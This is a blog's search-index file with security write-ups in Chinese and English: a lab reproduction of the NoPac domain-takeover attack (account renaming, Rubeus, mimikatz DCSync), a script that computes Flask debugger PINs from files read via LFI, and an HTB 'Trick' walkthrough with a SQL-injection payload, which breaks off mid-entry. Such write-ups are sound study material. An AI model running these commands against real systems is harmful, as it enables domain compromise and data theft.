<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-42278 &amp; CVE-2021-42287 (NoPac)</title>
      <link href="/posts/f80a473a.html"/>
      <url>/posts/f80a473a.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CVE-2021-42278，机器用户应当是 <code>COMUPTER$</code> 的形式，但是实际并没有验证机器账号是否有 <code>$</code>。导致机器用户名可以被模拟冒用</p><p>CVE-2021-42287，使用 COMPUTER 的 TGT 通过另一个用户去请求 COMPUTER 自己的 ST 时，将 TGT 发送给 KDC 后，当 KDC 找不到 COMPUTER 时，KDC 会再次寻找 <code>computer$</code> 的 ST，从而获得了 <code>computer$</code> 的 ST。从而获得了 <code>computer$</code> 的权限</p><p>利用条件：需要对属性 <code>sAMAccountName</code> and <code>servicePrincipalName</code> 有<strong>写权限</strong></p><p>可以利用域内默认的 MAQ 特性，默认允许域账户创建 10 个机器账户，而创建者对于机器账户具有写权限</p><blockquote><p>查看 MAQ 是否有限制，查看 LDAP 中的 ms-ds-machineaccountquota 属性</p></blockquote><p>攻击流程：</p><ol><li><p>创建一个机器账户，这在之前的文章都有所提及，使用 impacket 的 <code>addcomputer.py</code> 或是 <code>powermad</code>。<code>addcomputer.py</code> 是利用 <code>SAMR 协议 </code> 创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除</p></li><li><p>清除机器账户的 <code>servicePrincipalName</code> 属性</p></li><li><p>将机器账户的 <code>sAMAccountName</code>，更改为 DC 的机器账户名字，注意后缀不带$</p></li><li><p>为机器账户请求 TGT</p></li><li><p>将机器账户的 <code>sAMAccountName</code> 更改为其他名字，不与步骤 3 重复即可</p></li><li><p>通过 S4U2self 协议向 DC 请求 ST</p></li><li><p>DCsync</p></li></ol><p>示例</p><p>假如域内有一台域控名为 DC（域控对应的机器用户为 <code>DC$</code>），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户 <code>SAMTHEADMIN-48$</code>，再把机器用户 <code>SAMTHEADMIN-48$</code> 的 <code>sAMAccountName</code> 改成 <code>DC</code></p><p>然后利用 <code>DC</code> 去申请一个 TGT 票据。再把 <code>DC</code> 的 <code>sAMAccountName</code> 改为 <code>SAMTHEADMIN-48$</code>。这个时候 KDC 就会判断域内没有 <code>DC</code> 这个用户，自动去搜索 <code>DC$</code>（<code>DC$</code> 是域内已经的域控 DC 的 <code>sAMAccountName</code>），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC 的 ST 票据，最终获得域控制器 DC 的权限</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h2><p>这里利用 <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> 中的 scaner.py 来检测</p><p><img src="/posts/f80a473a/Pasted-image-20220910171113.png" alt="Pasted-image-20220910171113.png"></p><p>可以看到可以请求不包含 PAC 的 TGT，所以该域控可以被攻击</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>这里使用 了 <code>powermad</code> 和 <code>PowerView</code> 脚本</p><p>创建机器账户</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'1qaz2wsx'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token function">New-MachineAccount</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Password $<span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">-</span>Domain <span class="token string">"merak.local"</span> <span class="token operator">-</span>DomainController <span class="token string">"DC.merak.local"</span> <span class="token operator">-</span>Verbose</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910175306.png" alt="Pasted-image-20220910175306.png"></p><p>清除新建机器账户的 SPN</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-DomainObject</span> <span class="token string">"CN=NewEvilMachine,CN=Computers,DC=merak,DC=local"</span> <span class="token operator">-</span>Clear <span class="token string">'serviceprincipalname'</span> <span class="token operator">-</span>Verbose</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910202352.png" alt="Pasted-image-20220910202352.png"></p><p>修改机器账户的用户名为域控的用户名，注意不带 <code>$</code></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-MachineAccountAttribute</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Value <span class="token string">"DC"</span> <span class="token operator">-</span>Attribute samaccountname <span class="token operator">-</span>Verbose</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910203110.png" alt="Pasted-image-20220910203110.png"></p><p>请求 TGT</p><pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe asktgt /user:<span class="token string">"DC"</span> /password:<span class="token string">"1qaz2wsx"</span> /domain:<span class="token string">"merak.local"</span> /dc:<span class="token string">"DC.merak.local"</span> /nowrap</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910210604.png" alt="Pasted-image-20220910210604.png"></p><p>恢复机器账户原用户名</p><pre class="language-powershwll" data-language="powershwll"><code class="language-powershwll">Set-MachineAccountAttribute -MachineAccount &quot;NewEvilMachine&quot; -Value &quot;NewEvilMachine&quot; -Attribute samaccountname -Verbose</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910212231.png" alt="Pasted-image-20220910212231.png"></p><p>使用请求的 TGT 通过 S4U2self 获取 ST</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>self <span class="token operator">/</span>impersonateuser:<span class="token string">"administrator"</span> <span class="token operator">/</span>altservice:<span class="token string">"ldap/DC.merak.local"</span> <span class="token operator">/</span>dc:<span class="token string">"DC.merak.local"</span> <span class="token operator">/</span>ptt <span class="token operator">/</span>ticket:<span class="token namespace">[Base64 TGT]</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910212825.png" alt="Pasted-image-20220910212825.png"></p><p>验证</p><p><img src="/posts/f80a473a/Pasted-image-20220910213055.png" alt="Pasted-image-20220910213055.png"></p><p>DCSync</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:merak.local /kdc:DC.merak.local /user:krbtgt"</span> <span class="token string">"exit"</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910213342.png" alt="Pasted-image-20220910213342.png"></p><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p>创建机器账户</p><pre class="language-bash" data-language="bash"><code class="language-bash">python addcomputer.py -dc-ip <span class="token number">10.0</span>.100.10 -computer-name <span class="token string">'ImpacketEvilMachine$'</span> -computer-pass <span class="token string">'1qaz2wsx'</span> -dc-host DC -domain-netbios DC <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910214341.png" alt="Pasted-image-20220910214341.png"></p><p>清除 SPN</p><p>addspn.py 出自 <a href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python addspn.py -u <span class="token string">'merak\xzz'</span> -p <span class="token string">'Password123'</span> -t <span class="token string">'ImpacketEvilMachine$'</span> -c DC.merak.local</code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910215313.png" alt="Pasted-image-20220910215313.png"></p><p>修改机器账户用户名</p><p><a href="https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py">https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'ImpacketEvilMachine$'</span> -new-name <span class="token string">'DC'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910220735.png" alt="Pasted-image-20220910220735.png"></p><p>请求 TGT</p><pre class="language-bash" data-language="bash"><code class="language-bash">python getTGT.py -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC:1qaz2wsx'</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910223444.png" alt="Pasted-image-20220910223444.png"></p><p>恢复机器账户用户名</p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'DC'</span> -new-name <span class="token string">'ImpacketEvilMachine$'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910221237.png" alt="Pasted-image-20220910221237.png"></p><p>使用请求的 TGT 通过 S4U2self 获取 ST</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'DC.ccache'</span>python getST.py -impersonate <span class="token string">'administrator'</span> -spn <span class="token string">'cifs/DC.merak.local'</span> -k -no-pass -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC'</span></code></pre><p>失败，原因暂未可知</p><p><img src="/posts/f80a473a/Pasted-image-20220911110934.png" alt="Pasted-image-20220911110934.png"></p><p>附一个成功的截图</p><p><img src="/posts/f80a473a/Pasted-image-20220911111232.png" alt="Pasted-image-20220911111232.png"></p><h2 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h2><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python noPac.py merak.local/zs:<span class="token string">'Password123'</span> -dc-ip DC.merak.local -shell --impersonate administrator </code></pre><p><img src="/posts/f80a473a/Pasted-image-20220910230856.png" alt="Pasted-image-20220910230856.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tttang.com/archive/1380">https://tttang.com/archive/1380</a></p><p><a href="https://xz.aliyun.com/t/10666">https://xz.aliyun.com/t/10666</a></p><p><a href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p><p><a href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算 Flask PIN 码</title>
      <link href="/posts/736562f9.html"/>
      <url>/posts/736562f9.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Flask 在 debug 模式下会生成一个 Debugger PIN</p><pre class="language-bash" data-language="bash"><code class="language-bash">calico@ubuntu:~/Code/flask$ python3 app.py  * Running on http://0.0.0.0:8080/ <span class="token punctuation">(</span>Press CTRL+C to quit<span class="token punctuation">)</span> * Restarting with <span class="token function">stat</span> * Debugger is active<span class="token operator">!</span> * Debugger pin code: <span class="token number">169</span>-851-075</code></pre><p>通过这个 pin 码，我们可以在报错页面执行任意 python 代码</p><p>值得注意的是：<strong>在同一台机器上，多次重启 Flask 服务，PIN 码值不改变。也就是说 PIN 码是一个固定值</strong></p><h1 id="生成-PIN-码"><a href="#生成-PIN-码" class="headerlink" title="生成 PIN 码"></a>生成 PIN 码</h1><p>分析文件见下</p><ul><li><a href="https://www.anquanke.com/post/id/197602">https://www.anquanke.com/post/id/197602</a></li><li><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></li><li><a href="https://www.cnblogs.com/HacTF/p/8160076.html">https://www.cnblogs.com/HacTF/p/8160076.html</a></li></ul><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>只要获取了以下六个参数就可以在本地构造 PIN 码</p><ul><li><code>username</code> 启动这个 Flask 的用户</li><li><code>modname</code> 一般默认 flask.app</li><li><code>getattr(app, &#39;name&#39;, getattr(app.class, &#39;name&#39;))</code> 一般默认 flask.app 为 Flask</li><li><code>getattr(mod, &#39;file&#39;, None)</code> 为 flask 目录下的一个 app.py 的绝对路径,可在报错页面看到</li><li><code>str(uuid.getnode())</code> 是网卡 mac 地址的十进制表达式</li><li><code>get_machine_id()</code> 系统 id</li></ul><p>当网站存在 LFI 或任意文件读取时，就可以轻松获取这六个参数</p><ul><li><code>username</code> 可以从 <code>/etc/passwd</code> 或者 <code>/proc/self/environ</code> 环境变量中读取</li><li><code>str(uuid.getnode())</code> 可以从 <code>/sys/class/net/eth0/address</code> 或 <code>/sys/class/net/ens33/address</code> 中读取</li><li><code>getattr(mod, &#39;file&#39;, None)</code> 从报错页中获取，注意 python3 为 <code>app.py</code>，python2 为 <code>app.pyc</code></li><li><code>get_machine_id()</code><ul><li>linux 读取这三个文 <code>/proc/self/cgroup</code>、<code>/etc/machine-id</code>、<code>/proc/sys/kernel/random/boot_id</code></li><li>windows 读取注册表中的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code></li></ul></li></ul><h2 id="新旧差异"><a href="#新旧差异" class="headerlink" title="新旧差异"></a>新旧差异</h2><pre class="language-ad-tip" data-language="ad-tip"><code class="language-ad-tip">需要注意的是，新旧版本中 &#96;get_machine_id()&#96; 函数的实现不同https:&#x2F;&#x2F;github.com&#x2F;pallets&#x2F;werkzeug&#x2F;commit&#x2F;617309a7c317ae1ade428de48f5bc4a906c2950f</code></pre><p>从修改中可以看到</p><ul><li>旧版中依序读取 <code>/proc/self/cgroup</code>、<code>/etc/machine-id</code>、<code>/proc/sys/kernel/random/boot_id</code> 三个文件，只要读取到一个文件的内容，立马返回值</li><li>新版中是从 <code>/etc/machine-id</code>、<code>/proc/sys/kernel/random/boot_id</code> 中读到一个值后立即 break，然后和 <code>/proc/self/cgroup</code> 中的 id 值拼接</li></ul><p>另外一个需要注意的是新版中中使用 SHA1 的 hash 算法，而不是旧版的 MD5 算法</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain<span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># https://github.com/pallets/werkzeug/blob/f0c26b5e842fde616530a5f12a0087228f29d0ae/src/werkzeug/debug/__init__.py#L47</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token comment"># proc/sys/kernel/random/boot_id</span>    boot_id <span class="token operator">=</span> <span class="token string">"f615c180-18e4-4ffa-bc03-e7cedbde8088"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># /proc/self/cgroup</span>    group <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"cgroup.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>    cgroup <span class="token operator">=</span> group<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> linux <span class="token operator">+</span> boot_id <span class="token operator">+</span> cgroupprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment"># username</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>    <span class="token string">'/usr/local/lib/python3.10/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment"># '52242498922',# str(uuid.getnode()),  /sys/class/net/ens33/address</span>    <span class="token string">'2485377892356'</span><span class="token punctuation">,</span> <span class="token comment"># /sys/class/net/eth0/address</span>    <span class="token comment"># '19949f18ce36422da1402b3e3fe53008'# get_machine_id(), /etc/machine-id</span>    get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre><p>需要注意的是，新旧版本的 werkzeug 生成 PIN 码的方式不一样</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cloud.tencent.com/developer/article/1657739">https://cloud.tencent.com/developer/article/1657739</a></p><p><a href="https://www.anquanke.com/post/id/197602">https://www.anquanke.com/post/id/197602</a></p><p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p><p><a href="https://www.cnblogs.com/HacTF/p/8160076.html">https://www.cnblogs.com/HacTF/p/8160076.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] Trick</title>
      <link href="/posts/63ce8574.html"/>
      <url>/posts/63ce8574.html</url>
      
        <content type="html"><![CDATA[<h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><pre class="language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> trick.htb <span class="token punctuation">(</span><span class="token number">10.10</span>.11.166<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.39s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65531</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey: <span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">61</span>:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">72</span>:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span><span class="token number">25</span>/tcp <span class="token function">open</span>  smtp    Postfix smtpd<span class="token operator">|</span>_smtp-commands: debian.localdomain, PIPELINING, SIZE <span class="token number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING<span class="token number">53</span>/tcp <span class="token function">open</span>  domain  ISC BIND <span class="token number">9.11</span>.5-P4-5.1+deb10u7 <span class="token punctuation">(</span>Debian Linux<span class="token punctuation">)</span><span class="token operator">|</span> dns-nsid: <span class="token operator">|</span>_  bind.version: <span class="token number">9.11</span>.5-P4-5.1+deb10u7-Debian<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.14</span>.2<span class="token operator">|</span>_http-title: Coming Soon - Start Bootstrap Theme<span class="token operator">|</span>_http-server-header: nginx/1.14.2Service Info: Host:  debian.localdomain<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1738.39</span> seconds</code></pre><h4 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="DNS Zone Transfer"></a>DNS Zone Transfer</h4><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">dig</span> axfr @10.10.11.166 trick.htb<span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> DiG <span class="token number">9.17</span>.19-3-Debian <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> axfr @10.10.11.166 trick.htb<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">1</span> server found<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> global options: +cmdtrick.htb.              <span class="token number">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="token number">5</span> <span class="token number">604800</span> <span class="token number">86400</span> <span class="token number">2419200</span> <span class="token number">604800</span>trick.htb.              <span class="token number">604800</span>  IN      NS      trick.htb.trick.htb.              <span class="token number">604800</span>  IN      A       <span class="token number">127.0</span>.0.1trick.htb.              <span class="token number">604800</span>  IN      AAAA    ::1preprod-payroll.trick.htb. <span class="token number">604800</span> IN    CNAME   trick.htb.trick.htb.              <span class="token number">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="token number">5</span> <span class="token number">604800</span> <span class="token number">86400</span> <span class="token number">2419200</span> <span class="token number">604800</span><span class="token punctuation">;</span><span class="token punctuation">;</span> Query time: <span class="token number">1129</span> msec<span class="token punctuation">;</span><span class="token punctuation">;</span> SERVER: <span class="token number">10.10</span>.11.166<span class="token comment">#53(10.10.11.166) (TCP)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> WHEN: Fri Aug 05 <span class="token number">11</span>:36:44 CST <span class="token number">2022</span><span class="token punctuation">;</span><span class="token punctuation">;</span> XFR size: <span class="token number">6</span> records <span class="token punctuation">(</span>messages <span class="token number">1</span>, bytes <span class="token number">231</span><span class="token punctuation">)</span></code></pre><p>Get subdomain <code>preprod-payroll.trick.htb</code>, add it to <code>/etc/hosts</code> </p><h4 id="SQL-inject"><a href="#SQL-inject" class="headerlink" title="SQL inject"></a>SQL inject</h4><pre class="language-bash" data-language="bash"><code class="language-bash">POST /ajax.php?action<span class="token operator">=</span>login HTTP/1.1Host: preprod-payroll.trick.htbUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:78.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/78.0Accept: */*Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8X-Requested-With: XMLHttpRequestContent-Length: <span class="token number">35</span>Origin: http://preprod-payroll.trick.htbConnection: closeReferer: http://preprod-payroll.trick.htb/login.phpCookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>ui4d95mmq5f3b0pih3bp2gubc7<span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>admin</code></pre><p><code>username</code> have time-base injection</p><pre class="language-bash" data-language="bash"><code class="language-bash">---Parameter: username <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>    Type: time-based blind    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND (SELECT 2818 FROM (SELECT(SLEEP(5)))ymjy) AND '</span>NgWX<span class="token string">'='</span>NgWX<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>admin---</code></pre><p>result</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># databases</span>available databases <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>:<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema<span class="token punctuation">[</span>*<span class="token punctuation">]</span> payroll_db<span class="token comment"># payroll_db's tables</span>Database: payroll_db<span class="token punctuation">[</span><span class="token number">11</span> tables<span class="token punctuation">]</span>+---------------------+<span class="token operator">|</span> position            <span class="token operator">|</span><span class="token operator">|</span> allowances          <span class="token operator">|</span><span class="token operator">|</span> attendance          <span class="token operator">|</span><span class="token operator">|</span> deductions          <span class="token operator">|</span><span class="token operator">|</span> department          <span class="token operator">|</span><span class="token operator">|</span> employee            <span class="token operator">|</span><span class="token operator">|</span> employee_allowances <span class="token operator">|</span><span class="token operator">|</span> employee_deductions <span class="token operator">|</span><span class="token operator">|</span> payroll             <span class="token operator">|</span><span class="token operator">|</span> payroll_items       <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">users</span>               <span class="token operator">|</span>+---------------------+Database: payroll_dbTable: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">8</span> columns<span class="token punctuation">]</span>+-----------+--------------+<span class="token operator">|</span> Column    <span class="token operator">|</span> Type         <span class="token operator">|</span>+-----------+--------------+<span class="token operator">|</span> address   <span class="token operator">|</span> text         <span class="token operator">|</span><span class="token operator">|</span> contact   <span class="token operator">|</span> text         <span class="token operator">|</span><span class="token operator">|</span> doctor_id <span class="token operator">|</span> int<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>      <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">id</span>        <span class="token operator">|</span> int<span class="token punctuation">(</span><span class="token number">30</span><span class="token 